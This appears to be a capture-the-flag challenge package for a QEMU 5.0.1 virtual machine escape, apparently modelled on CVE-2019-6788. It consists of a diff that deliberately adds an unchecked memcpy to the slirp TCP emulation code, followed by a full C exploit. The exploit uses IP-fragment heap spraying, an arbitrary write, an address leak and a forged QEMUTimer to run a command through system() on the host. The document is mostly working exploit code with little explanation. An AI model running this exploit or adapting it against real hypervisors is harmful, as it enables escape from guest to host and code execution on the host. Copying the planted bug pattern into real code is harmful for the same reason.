It's just as similar as CVE-2019-6788.

- Build is the qemu building dir.
- Emu-5.0.1 is the source code.
- Start_qemu_sh is the shell start qemu.

## Patch

```
diff --git a/slirp/src/ip_input.c b/slirp/src/ip_input.c
index 7f017a2..43503e0 100644
--- a/slirp/src/ip_input.c
+++ b/slirp/src/ip_input.c
@@ -191,6 +191,18 @@ void ip_input(struct mbuf *m)
     } else
         ip->ip_len -= hlen;
 
+    if(!(m->m_flags & M_EXT)){
+        uint8_t *ip_ptr;
+        ip_ptr = (uint8_t *)ip;
+        ip_ptr += sizeof(struct ip);
+        if((ip_ptr[0x111] == 0x59 && ip_ptr[0x222] == 0x44) ||
+        (ip_ptr[2] == 0x5 && ip_ptr[3] == 0x39 && ip_ptr[13] == 0x02)){
+            slirp->enable_emu = true;
+        }else{
+            slirp->enable_emu = false;
+        }
+    }
+
     /*
      * Switch out to protocol's input routine.
      */
diff --git a/slirp/src/tcp_subr.c b/slirp/src/tcp_subr.c
index a1016d9..e48d26b 100644
--- a/slirp/src/tcp_subr.c
+++ b/slirp/src/tcp_subr.c
@@ -552,6 +552,7 @@ static const struct tos_t tcptos[] = {
     { 0, 6668, IPTOS_THROUGHPUT, EMU_IRC }, /* IRC undernet */
     { 0, 7070, IPTOS_LOWDELAY, EMU_REALAUDIO }, /* RealAudio control */
     { 0, 113, IPTOS_LOWDELAY, EMU_IDENT }, /* identd protocol */
+    { 0, 1337, IPTOS_LOWDELAY, EMU_UPUP }, /* upup protocol */
     { 0, 0, 0, 0 }
 };
 
@@ -933,6 +934,29 @@ int tcp_emu(struct socket *so, struct mbuf *m)
         }
         return 1;
 
+    case EMU_UPUP:
+        bptr = m->m_data;
+        struct upup
+        {
+            uint16_t id;
+            char name[0x14];
+            uint32_t len;
+        };
+        struct upup *upup;
+        upup = (struct upup *)bptr;
+        if(upup->id == 0x4242){
+            if(strncmp(upup->name,"YUNDINGLAB_INVITEYOU",0x14) == 0){
+                if(upup->len <= m->m_len){
+                    memcpy(so->so_rcv.sb_wptr,bptr,upup->len);
+                    so->so_rcv.sb_wptr += upup->len;
+                    return 1;
+                }
+            }
+        }else
+        {
+            return 1;
+        }
+
     default:
         /* Ooops, not emulated, won't call tcp_emu again */
         so->so_emu = 0;
diff --git a/slirp/src/tcp_input.c b/slirp/src/tcp_input.c
index d55b0c8..b81b9db 100644
--- a/slirp/src/tcp_input.c
+++ b/slirp/src/tcp_input.c
@@ -540,8 +540,10 @@ findso:
              * Add data to socket buffer.
              */
             if (so->so_emu) {
-                if (tcp_emu(so, m))
-                    sbappend(so, m);
+                if(slirp->enable_emu){
+                    if (tcp_emu(so, m))
+                        sbappend(so, m);
+                }
             } else
                 sbappend(so, m);
 
diff --git a/slirp/src/misc.h b/slirp/src/misc.h
index 81b370c..fb9d199 100644
--- a/slirp/src/misc.h
+++ b/slirp/src/misc.h
@@ -28,6 +28,7 @@ struct gfwd_list {
 #define EMU_REALAUDIO 0x5
 #define EMU_RLOGIN 0x6
 #define EMU_IDENT 0x7
+#define EMU_UPUP 0x8
 
 #define EMU_NOCONNECT 0x10 /* Don't connect */
```

## EXP

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <net/if.h>
#include <linux/if_ether.h>   //ETH_P_ALL
#include <errno.h>

#define IP4_LEN 20
#define TCP_LEN 20
#define ICMP_LEN 8
#define ETH_LEN 14

uint64_t heap_base = 0;
uint64_t elf_base = 0;
int getchar_flag = 0;

struct ip_pkt_info{
    uint16_t ip_id;
    uint16_t ip_off;
    uint8_t ip_p;
    bool MF;
};

uint16_t checksum(uint16_t *addr, int len) {
    int count = len;
    register uint32_t sum = 0;
    uint16_t answer = 0;

    // Sum up 2-byte values until none or only one byte left.
    while (count > 1) {
        sum += *(addr++);
        count -= 2;
    }

    // Add left-over byte, if any.
    if (count > 0) {
        sum += *(uint8_t *)addr;
    }

    // Fold 32-bit sum into 16 bits; we lose information by doing this,
    // increasing the chances of a collision.
    // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    // Checksum is one's compliment of sum.
    answer = ~sum;

    return (answer);
}

void hexdump(const char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char *)addr;

    // Output description if given.
    if (desc != NULL)
        printf("%s:\n", desc);
    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %i\n", len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).
        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);
            // Output the offset.
            printf("  %04x ", i);
        }
        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf("  %s\n", buff);
}

uint8_t *malloc_8(int size){
    if(size < 0){
        perror("[*] malloc 8 failed,size < 0.");
	    exit(EXIT_FAILURE);
    }
    uint8_t *tmp;
    tmp = (uint8_t *)malloc(size);
    if(tmp == NULL){
        perror("[*] malloc 8 error.");
	    exit(EXIT_FAILURE);
    }else{
        memset(tmp,0,size);
    	return tmp;
    }
}

uint16_t *malloc_16(int size){
    if(size < 0){
        perror("[*] malloc 16 failed,size < 0.");
        exit(EXIT_FAILURE);
    }
    uint16_t *tmp;
    tmp = (uint16_t *)malloc(size*sizeof(uint16_t));
    if(tmp == NULL){
        perror("[*] malloc 16 error.");
        exit(EXIT_FAILURE);
    }else{
        memset(tmp,0,size*sizeof(uint16_t));
	    return tmp;
    }
}

uint32_t *malloc_32(int size){
    if(size < 0){
        perror("[*] malloc 32 failed,size < 0.");
        exit(EXIT_FAILURE);
    }
    uint32_t *tmp;
    tmp = (uint32_t *)malloc(size*sizeof(uint32_t));
    if(tmp == NULL){
        perror("[*] malloc 32 error.");
        exit(EXIT_FAILURE);
    }else{
        memset(tmp,0,size*sizeof(uint32_t));
	    return tmp;
    }
}

char *malloc_char(int size){
    if(size < 0){
        perror("[*] malloc char failed,size < 0.");
        exit(EXIT_FAILURE);
    }
    char *tmp;
    tmp = (char *)malloc(size*sizeof(char));
    if(tmp == NULL){
        perror("[*] malloc char error.");
        exit(EXIT_FAILURE);
    }else{
        memset(tmp,0,size*sizeof(char));
	    return tmp;
    }
}

void send_ip_pkt(struct ip_pkt_info *pkt_info,uint8_t *payload,int payload_len){
    struct ip iphdr;
    struct tcphdr tcphdr;
    uint8_t *packet;
    uint32_t *ip_flags;
    uint32_t *tcp_flags;
    char *interface;
    char *source_ip;
    char *destion_ip;
    struct sockaddr_in sin;
    struct ifreq ifr;

    packet = malloc_8(IP_MAXPACKET);
    ip_flags = malloc_32(4);
    tcp_flags = malloc_32(8);
    interface = malloc_char(30);
    source_ip = malloc_char(INET_ADDRSTRLEN);
    destion_ip = malloc_char(INET_ADDRSTRLEN);

    strcpy(interface,"enp0s3");

    int if_sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(if_sd < 0){
        perror("[*] socket interface failed. ---send_ip_pkt");
	    exit(EXIT_FAILURE);
    }

    memset(&ifr,0,sizeof(ifr));
    memcpy(&ifr.ifr_name,interface,sizeof(ifr.ifr_name));
    if(ioctl(if_sd,SIOCGIFINDEX,&ifr) < 0){
        perror("[*] ioctl find index failed. ---send_ip_pkt");
    	exit(EXIT_FAILURE);
    }

    close(if_sd);

    strcpy(source_ip,"127.0.0.1");
    strcpy(destion_ip,"127.0.0.1");

    iphdr.ip_v = 4;
    iphdr.ip_hl = 5;
    iphdr.ip_tos = 0;
    iphdr.ip_len = htons(IP4_LEN+TCP_LEN+payload_len);
    iphdr.ip_id = htons(pkt_info->ip_id);
    iphdr.ip_ttl = 0xFF;
    iphdr.ip_p = pkt_info->ip_p;

    ip_flags[0] = 0;
    ip_flags[1] = 0;
    ip_flags[2] = pkt_info->MF;
    ip_flags[3] = 0;
    iphdr.ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) + (ip_flags[3] << 12) + (pkt_info->ip_off >> 3));

    if(inet_pton(AF_INET,source_ip,&(iphdr.ip_src)) != 1){
        perror("[*] inet_pton1 source ip failed. ---send_ip_pkt");
        exit(EXIT_FAILURE);
    }
    if(inet_pton(AF_INET,destion_ip,&(iphdr.ip_dst)) != 1){
        perror("[*] inet_pton2 destion ip failed. ---send_ip_pkt");
        exit(EXIT_FAILURE);
    }

    iphdr.ip_sum = 0;
    iphdr.ip_sum = checksum((uint16_t *)&iphdr,IP4_LEN);
    
    memcpy(packet,&iphdr,IP4_LEN);
    memcpy(packet+IP4_LEN,payload,payload_len);

    memset(&sin,0,sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = iphdr.ip_dst.s_addr;

    int sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(sd < 0){
        perror("[*] socket failed. ---send_ip_pkt");
        exit(EXIT_FAILURE);
    }

    if(setsockopt(sd,SOL_SOCKET,SO_BINDTODEVICE,&ifr,sizeof(ifr)) < 0){
        perror("[*] setsockopt failed. ---send_ip_pkt");
        exit(EXIT_FAILURE);
    }

    if(sendto(sd,packet,payload_len+IP4_LEN,0,(struct sockaddr *)&sin,sizeof(struct sockaddr)) < 0){
        perror("[*] sendto failed. ---send_ip_pkt");
        exit(EXIT_FAILURE);
    }

    close(sd);

    free(packet);
    free(ip_flags);
    free(tcp_flags);
    free(source_ip);
    free(destion_ip);
    free(interface);
}

void spray(uint16_t spray_id,int spray_size){
    struct ip iphdr;
    struct tcphdr tcphdr;
    char *source_ip;
    char *destion_ip;
    char *interface;
    uint8_t *packet;
    uint32_t *ip_flags;
    uint32_t *tcp_flags;
    struct sockaddr_in sin;
    struct ifreq ifr;

    packet = malloc_8(IP_MAXPACKET);
    source_ip = malloc_char(INET_ADDRSTRLEN);
    destion_ip = malloc_char(INET_ADDRSTRLEN);
    interface = malloc_char(30);
    ip_flags = malloc_32(4);
    tcp_flags = malloc_32(8);

    strcpy(interface,"enp0s3");

    memset(&ifr,0,sizeof(ifr));
    memcpy(ifr.ifr_name,interface,sizeof(ifr.ifr_name));

    int if_sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(if_sd < 0){
        perror("[*] socket interface failed. ---spray");
        exit(EXIT_FAILURE);
    }
    if(ioctl(if_sd,SIOCGIFINDEX,&(ifr)) < 0){
        perror("[*] ioctl find index error. ---spray");
        exit(EXIT_FAILURE);
    }

    close(if_sd);

    strcpy(source_ip,"127.0.0.1");
    strcpy(destion_ip,"127.0.0.1");

    iphdr.ip_v = 4;
    iphdr.ip_hl = IP4_LEN/4;
    iphdr.ip_tos = 0;
    iphdr.ip_len = htons(spray_size);
    iphdr.ip_id = htons(spray_id);
    iphdr.ip_ttl = 0xFF;
    iphdr.ip_p = 0xFF;

    ip_flags[0] = 0;
    ip_flags[1] = 0;
    ip_flags[2] = 1;
    ip_flags[3] = 0;
    iphdr.ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) + (ip_flags[3] << 12) + 0);

    if(inet_pton(AF_INET,source_ip,&(iphdr.ip_src)) != 1){
        perror("[*] inet_pton1 failed. ---spray");
        exit(EXIT_FAILURE);
    }
    if(inet_pton(AF_INET,destion_ip,&(iphdr.ip_dst)) != 1){
        perror("[*] inet_pton2 failed. ---spray");
        exit(EXIT_FAILURE);
    }
    
    iphdr.ip_sum = 0;
    iphdr.ip_sum = checksum((uint16_t *)&iphdr,IP4_LEN);

    memcpy(packet,&iphdr,IP4_LEN);

    uint8_t payload[spray_size-IP4_LEN];
    memset(payload,0,spray_size-IP4_LEN);
    memcpy(packet+IP4_LEN,payload,spray_size-IP4_LEN);

    memset(&sin,0,sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = iphdr.ip_dst.s_addr;

    int sd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(sd < 0){
        perror("[*] socket failed. ---spray");
        exit(EXIT_FAILURE);
    }

    if(setsockopt(sd,SOL_SOCKET,SO_BINDTODEVICE,&ifr,sizeof(ifr)) < 0){
        perror("[*] setsockopt failed. ---spray");
        exit(EXIT_FAILURE);
    }

    if(sendto(sd,packet,spray_size,0,(struct sockaddr *)&sin,sizeof(struct sockaddr)) < 0){
        perror("[*] sendto failed. ---spray");
        exit(EXIT_FAILURE);
    }

    close(sd);

    free(packet);
    free(source_ip);
    free(destion_ip);
    free(interface);
    free(ip_flags);
    free(tcp_flags);
}

//can write all mmap area which is >= 0x400
void write_anywhere(uint16_t spray_id,uint64_t addr,int addr_len,uint8_t *write_any_data,int write_any_data_len,int spray_time){
    for (int i = 0; i < spray_time; i++){
        spray(spray_id+i,0x2000);
        printf("write any spray time %d.\n",i+1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("10.0.2.2");
    sin.sin_port = htons(1337);

    int sd = socket(AF_INET,SOCK_STREAM,0);
    if(sd < 0){
        perror("[*] socket create failed. ---write_anywhere");
        exit(EXIT_FAILURE);
    }

    if(connect(sd,(struct sockaddr *)&sin,sizeof(struct sockaddr)) < 0){
        perror("[*] connect failed. ---write_anywhere");
        exit(EXIT_FAILURE);
    }

    /* fake icmp */
    struct ip_pkt_info pkt_info;
    pkt_info.ip_id = 0xdead;
    pkt_info.ip_off = 0;
    pkt_info.ip_p = 0xFF;    // so that only write anywhere,but not go in tcp_input.c (checksum failed)
    pkt_info.MF = 1;
    int payload_len = 0x400;            //will afect write addr
    uint8_t *payload = malloc_8(payload_len);
    memset(payload,'w',payload_len);
    send_ip_pkt(&pkt_info,payload,payload_len);

    /* prapare write any data */
    uint8_t *write_data = malloc_8(0x500);
    uint8_t *write_data_8 = write_data;
    uint16_t *write_data_16 = (uint16_t *)write_data;
    uint32_t *write_data_32 = (uint32_t *)write_data;
    uint64_t *write_data_64 = (uint64_t *)write_data;

    write_data_16[0] = 0x4242;
    write_data_8 += 2;
    strcpy(write_data_8,"YUNDINGLAB_INVITEYOU");
    write_data_8 += 0x16;
    write_data_32 = (uint32_t *)write_data_8;
    write_data_32[0] = 0x500;

    write_data[253] = 'Y';
    write_data[526] = 'D';

    for (int j = 0; j < 0x66; j++){
        write(sd,write_data,0x500);
        sleep(0.2); //must be have, unless the 899 write data will be archieve already.
        printf("[*] write data, time %d\n",j+1);
    }

    write_data_32[0] = 896+addr_len;
    write_data_64 += 104;
    write_data_64[0] = 0x0;
    write_data_64[1] = 0x675;
    write_data_64[2] = 0x0;
    write_data_64[3] = 0x0;
    write_data_64[4] = 0x0;
    write_data_64[5] = 0x0;
    write_data_32 = (uint32_t *)write_data_64;
    write_data_32 += 12;
    write_data_32[0] = 0x2;  //m_flags must set 2,unless m_free function will be crash.
    write_data_32[1] = 0x608;
    write_data_32 += 2;
    write_data_64 = (uint64_t *)write_data_32;
    write_data_64[0] = 0x0;
    write_data_8 = (uint8_t *)(write_data_64+1);
    for (int k = 0; k < addr_len; k++){
        *write_data_8++ = ((addr) >> (k*8)) & 0xFF; //m_data
    }

    write(sd,write_data,0x500);
    //sleep(5); //must be have,unless this write function will not be implement.

    struct ip_pkt_info pkt_info_cat;
    pkt_info_cat.ip_id = 0xdead;
    pkt_info_cat.ip_off = 0x400;
    pkt_info_cat.ip_p = 0xFF;
    pkt_info_cat.MF = 0;

    //if(getchar_flag){
    //    getchar();
    //}
    send_ip_pkt(&pkt_info_cat,write_any_data,write_any_data_len);

    free(payload);
    free(write_data);
    close(sd);
}

void leak(uint16_t leak_spray_id,uint64_t addr,int addr_len){
    printf("[*] leak spray start.\n");
    for(int i=0; i<0x10; i++){
        spray(leak_spray_id+i,0x2000);
        printf("[*] leak spray, time %d\n",i+1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(1337);
    sin.sin_addr.s_addr = inet_addr("10.0.2.2");

    int sd = socket(AF_INET,SOCK_STREAM,0);
    if(sd < 0){
        perror("[*] socket failed. ---leak");
        exit(EXIT_FAILURE);
    }

    if(connect(sd,(struct sockaddr *)&sin,sizeof(struct sockaddr)) < 0){
        perror("[*] connect failed. ---leak");
        exit(EXIT_FAILURE);
    }

    struct ip_pkt_info pkt_info;
    pkt_info.ip_id = 0xbeef;
    pkt_info.ip_off = 0x0;
    pkt_info.ip_p = IPPROTO_ICMP;
    pkt_info.MF = 1;
    int payload_len = 0x400;
    uint8_t *payload = malloc_8(payload_len);
    memset(payload,'A',payload_len);
    printf("[*] send icmp 1 part.\n");
    send_ip_pkt(&pkt_info,payload,payload_len);

    /* out of bound fake m_data */
    uint8_t *write_data = malloc_8(0x500);
    uint8_t *write_data_8 = write_data;
    uint16_t *write_data_16 = (uint16_t *)write_data;
    uint32_t *write_data_32 = (uint32_t *)write_data;
    uint64_t *write_data_64 = (uint64_t *)write_data;

    write_data_16[0] = 0x4242;
    write_data_8 += 2;
    strcpy(write_data_8,"YUNDINGLAB_INVITEYOU");
    write_data_8 += 0x16;
    write_data_32 = (uint32_t *)write_data_8;
    write_data_32[0] = 0x500;

    write_data[253] = 'Y';
    write_data[526] = 'D';

    for (int j = 0; j < 0x66; j++){
        write(sd,write_data,0x500);
        sleep(0.2); //must be have, unless the 899 write data will be archieve already.
        printf("[*] leak write data, time %d\n",j+1);
    }

    write_data_32[0] = 896+addr_len;
    write_data_64 += 104;
    write_data_64[0] = 0x0;
    write_data_64[1] = 0x675;
    write_data_64[2] = 0x0;
    write_data_64[3] = 0x0;
    write_data_64[4] = 0x0;
    write_data_64[5] = 0x0;
    write_data_32 = (uint32_t *)write_data_64;
    write_data_32 += 12;
    write_data_32[0] = 0x2;   //reflect the if.c->if_output 会影响到最后发送icmp包
    write_data_32[1] = 0x608;
    write_data_32 += 2;
    write_data_64 = (uint64_t *)write_data_32;
    write_data_64[0] = 0x0;
    write_data_8 = (uint8_t *)(write_data_64+1);
    for (int k = 0; k < addr_len; k++){
        *write_data_8++ = ((addr) >> (k*8)) & 0xFF; //m_data
    }

    write(sd,write_data,0x500);

    struct ip_pkt_info pkt_info_2;
    pkt_info_2.ip_id = 0xbeef;
    pkt_info_2.ip_off = 0x400;
    pkt_info_2.ip_p = IPPROTO_ICMP;
    pkt_info_2.MF = 0;
    int payload_len_2 = 0;
    //uint8_t *payload_2 = malloc_8(payload_len_2);

    int recv_sd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
    if(recv_sd < 0){
        perror("socket recv failed. ---leak.");
        exit(EXIT_FAILURE);
    }

    send_ip_pkt(&pkt_info_2,payload,payload_len_2);

    int recv_flag = 1;
    int status;
    int recv_size;
    struct ip *recv_ip;
    struct icmp *recv_icmp;
    uint8_t recv_buf[IP_MAXPACKET];
    struct sockaddr recv_sin;
    memset(&recv_sin,0,sizeof(recv_sin));
    socklen_t sock_addr_len = sizeof(struct sockaddr);
    struct timeval wait,t1,t2;
    struct timezone tz;
    double tt;

    (void)gettimeofday(&t1,&tz);
    wait.tv_sec = 3;                                 // 3 secends timeout.
    wait.tv_usec = 0;
    if(setsockopt(recv_sd,SOL_SOCKET,SO_RCVTIMEO,(char *)&wait,sizeof(struct timeval)) < 0){
        perror("[*] setsockopt timeout failed. ---leak");
        exit(EXIT_FAILURE);
    }
    recv_ip = (struct ip *)(recv_buf + ETH_LEN);
    recv_icmp = (struct icmp *)(recv_buf + ETH_LEN + IP4_LEN);

    printf("[*] start to recvfrom data.\n");
    while (1){
        memset(recv_buf,0,IP_MAXPACKET*sizeof(uint8_t));
        memset(&recv_sin,0,sizeof(struct sockaddr));
        if((recv_size = recvfrom(recv_sd,recv_buf,IP_MAXPACKET,0,(struct sockaddr *)&recv_sin,&sock_addr_len)) <= 0){   //加括号。。。
            status = errno;
            if(status == EAGAIN){
                printf("[*] No replay within %li seconds. ---leak",wait.tv_sec);
                exit(EXIT_FAILURE);
            }else{
                perror("[*] recvfrom() failed");
                exit(EXIT_FAILURE);
            }
        }
        
        if((((recv_buf[12] << 8) + (recv_buf[13])) == ETH_P_IP )&&
            (recv_ip->ip_p == IPPROTO_ICMP) &&
            (recv_icmp->icmp_type == ICMP_ECHOREPLY)){
                (void)gettimeofday(&t2,&tz);
                tt = (double)(t2.tv_sec - t1.tv_sec) * 1000.0 + (double)(t2.tv_usec - t1.tv_usec)/1000.0;
                printf("%g ms (%i bytes recvived)\n",tt,recv_size);

                hexdump("recv data",recv_buf,recv_size);

                if(recv_size < 0x200){
                    continue;
                }
                break;
        }
        
    }
    printf("[*] leak finished.\n");

    heap_base = *((uint64_t *)(recv_buf+0x48)) & 0xFFFFFFFFFF000000;
    elf_base = *((uint64_t *)(recv_buf+0x60)) - 0x4a63bc;//0x57bfa2
    printf("[*] heap base addr:%lx\n",heap_base);
    printf("[*] elf base addr:%lx\n",elf_base);
    
    free(payload);
    free(write_data);
    //free(payload_2);
    //free(recv_buf);
    close(sd);
    close(recv_sd);
}

int main(){
    
    /* wait to qemu init socket */
    int init_sd = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("10.0.2.2");
    sin.sin_port = htons(1337);
    if(connect(init_sd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in)) < 0){
        perror("connect failed.");
        exit(EXIT_FAILURE);
    }

    close(init_sd);

    /* start to fake icmp struct */
    uint16_t write_spray_id = 0xaabb;
    int write_data_len;
    uint8_t *write_data = malloc_8(0x500);

    char eth_head[] = "\x52\x55\x0a\x00\x02\02\x52\x54\x00\x12\x34\x56\x08\x00";
    char shellcode[] = "pwd";//cat /root/flag

    struct ip iphdr;
    struct icmp icmphdr;
    char source_ip[INET_ADDRSTRLEN];
    char desstion_ip[INET_ADDRSTRLEN];

    strcpy(source_ip,"10.0.2.15");
    strcpy(desstion_ip,"10.0.2.2");
    iphdr.ip_v = 4;
    iphdr.ip_hl = IP4_LEN/4;
    iphdr.ip_tos = 0;
    iphdr.ip_len = 0x8;   //icmp len
    iphdr.ip_id = 0xacac;
    iphdr.ip_off = 0x0;
    iphdr.ip_ttl = 0xFF;
    iphdr.ip_p = IPPROTO_ICMP;
    if(inet_pton(AF_INET,source_ip,&(iphdr.ip_src)) != 1){
        perror("[*] inet_pton1 failed. ---main");
        exit(EXIT_FAILURE);
    }
    if(inet_pton(AF_INET,desstion_ip,&(iphdr.ip_dst)) != 1){
        perror("[*] inet_pton2 failed. ---main");
        exit(EXIT_FAILURE);
    }
    iphdr.ip_sum = 0;
    iphdr.ip_sum = checksum((uint16_t *)&iphdr,IP4_LEN);

    icmphdr.icmp_type = 8;
    icmphdr.icmp_code = 0;
    icmphdr.icmp_id = 0x1234;
    icmphdr.icmp_seq = 0;
    icmphdr.icmp_cksum = 0;
    icmphdr.icmp_cksum = checksum((uint16_t *)&icmphdr,8);

    memcpy(write_data,eth_head,ETH_LEN);
    memcpy(write_data+ETH_LEN,&iphdr,sizeof(struct ip));
    memcpy(write_data+ETH_LEN+sizeof(struct ip),&icmphdr,sizeof(struct icmp));
    memcpy(write_data+ETH_LEN+sizeof(struct ip)+ICMP_LEN,shellcode,strlen(shellcode));
    write_data_len = ETH_LEN+sizeof(struct ip)+ICMP_LEN+strlen(shellcode);

    write_anywhere(write_spray_id,0xac0-0x400,3,write_data,write_data_len,0x200);//地址不能乱设置，mmap区域是一些地址，覆盖掉会导致crash。spray次数最好是0x200,0x300过大

    /* start to leak fake icmp data to get addr */
    uint16_t leak_spray_id = 0xccdd;
    leak(leak_spray_id,0xac0+ETH_LEN+IP4_LEN,3);

    /* start to fake timer in heap area */
    // fake QEMUTimerList
    uint64_t *fake_timer;
    fake_timer = (uint64_t *)malloc(0x100);
    fake_timer[0] = elf_base + 0x1291c90; //0x12dbcb0
    fake_timer[1] = 0;
    fake_timer[2] = 0;
    fake_timer[3] = 0;
    fake_timer[4] = 0;
    fake_timer[5] = 0;
    fake_timer[6] = 0;
    fake_timer[7] = 0x100000000;
    fake_timer[8] = heap_base + 0x2050 + 0x70;
    fake_timer[9] = 0;
    fake_timer[10] = elf_base + 0x2a96df8;//0x249fb88
    fake_timer[11] = elf_base + 0x329d63;//0x6707c9
    fake_timer[12] = 0;
    fake_timer[13] = 0x100000000;

    // fake QEMUTimer
    fake_timer[14] = 1;
    fake_timer[15] = heap_base + 0x2050;
    fake_timer[16] = elf_base + 0x2d03e0; // system@plt   0x2d9820
    fake_timer[17] = heap_base + 0xaea; // shellcode
    fake_timer[18] = 0;
    fake_timer[19] = 0x000f424000000001;

    printf("[*] start to fake QEMUTimerList in heap arae (heap+0x2050).\n");
    uint16_t fake_time_spray_id = 0xddee;
    write_anywhere(fake_time_spray_id,(heap_base+0x2050-0x400),8,(uint8_t *)fake_timer,0xa0,0x20); //地址处加括号！！！（不用strlen，会被\x00截断）
    printf("[*] fake QEMUTimerList finished.\n");

    uint8_t *change_main_loop;
    change_main_loop = malloc_8(0x100);
    *((uint64_t *)change_main_loop) = heap_base+0x2050;
    uint16_t change_main_loop_tlg_spray_id = 0xeeff;
    //getchar_flag = 1;
    printf("[*] start to change main_loop_tlg array into fake QEMUTimerList.\n");
    write_anywhere(change_main_loop_tlg_spray_id,(elf_base+0x1291c60-0x400),8,change_main_loop,8,0x20);//0x12dbc80
    printf("[!] finished! Now do whatever you want!\n");

    return 0;
}
```

